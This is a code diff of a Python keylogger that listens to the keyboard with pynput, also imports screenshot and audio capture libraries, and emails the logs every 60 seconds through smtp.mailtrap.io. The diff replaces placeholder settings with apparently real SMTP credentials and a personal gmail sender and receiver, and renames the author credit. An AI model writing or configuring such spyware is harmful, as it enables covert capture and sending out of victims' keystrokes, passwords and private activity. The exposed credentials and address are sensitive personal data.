@@ -8,8 +8,8 @@ try:
     import wave
     import pyscreenshot
     import sounddevice as sd
-    from pynput import keyboard
-    from pynput.keyboard import Listener
+    from pynput import keyboard  # For keyboard listener and key logging
+    from pynput.keyboard import Listener  # Listener class from pynput
     from email import encoders
     from email.mime.base import MIMEBase
     from email.mime.multipart import MIMEMultipart
@@ -22,8 +22,8 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
+    EMAIL_ADDRESS = "dd596b9186771c"
+    EMAIL_PASSWORD = "72b7c1ecf95f6b"
     SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
@@ -61,15 +61,15 @@ finally:
             self.appendlog(current_key)
 
         def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
+            sender = "sampathx2004@gmail.com"
+            receiver = "sampathx2004@gmail.com"
 
             m = f"""\
             Subject: main Mailtrap
             To: {receiver}
             From: {sender}
 
-            Keylogger by aydinnyunus\n"""
+            Keylogger by sampath\n"""
 
             m += message
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
@@ -143,3 +143,4 @@ finally:
     keylogger.run()
 
 
+    
